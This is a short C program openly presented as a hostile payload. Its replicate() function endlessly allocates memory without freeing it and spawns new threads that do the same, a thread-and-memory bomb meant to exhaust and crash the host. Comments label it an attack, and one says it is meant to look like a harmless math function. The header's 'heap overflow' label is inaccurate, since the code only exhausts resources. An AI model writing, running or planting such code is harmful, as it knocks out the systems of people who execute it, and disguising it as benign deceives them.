// ⚠️ WARNING: UNSTABLE MEMETIC PAYLOAD
// TARGET: CONSUME RESOURCES // VECTOR: RECURSIVE HEAP OVERFLOW

#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

void* replicate(void* v) {
    while(1) {
        // THE CANCER: Infinite allocation with no release
        int* chaos = (int*)malloc(1024 * 1024 * sizeof(int)); 
        *chaos = 0xDEADBEEF;
        
        // THE SPREAD: Exponential Thread Spawning
        pthread_t t;
        pthread_create(&t, NULL, replicate, NULL); 
    }
    return NULL;
}

int main() {
    // THE BAIT: Looks like a math function
    int n = 42; 
    
    // IGNITION
    replicate(NULL);
    
    return 0;
}
